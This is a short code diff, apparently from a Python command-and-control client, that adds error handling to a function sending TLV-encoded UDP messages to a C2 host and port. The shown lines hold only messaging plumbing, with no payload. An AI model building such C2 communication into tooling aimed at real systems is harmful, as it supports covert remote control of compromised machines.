@@ -50,11 +50,16 @@ def encode_arg_bytes(cmd_name, arg):
 
 
 def send_message(message_type, payload):
-        """Open a short-lived connection to the task server and send one message."""
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.sendto(encode_tlv(message_type, payload), (C2_HOST, C2_PORT))
-    data, address = sock.recvfrom(1024)
-    return decode_tlv(data)
+    """Open a short-lived connection to the task server and send one message."""
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.sendto(encode_tlv(message_type, payload), (C2_HOST, C2_PORT))
+        #sock.bind(('', C2_PORT))
+        data, address = sock.recvfrom(1024)
+        return decode_tlv(data)
+    except ConnectionResetError:
+        print("[!] Server port is unreachable. Is the server running?")
+        return None
 
     """try:
         sock.connect((C2_HOST, C2_PORT))
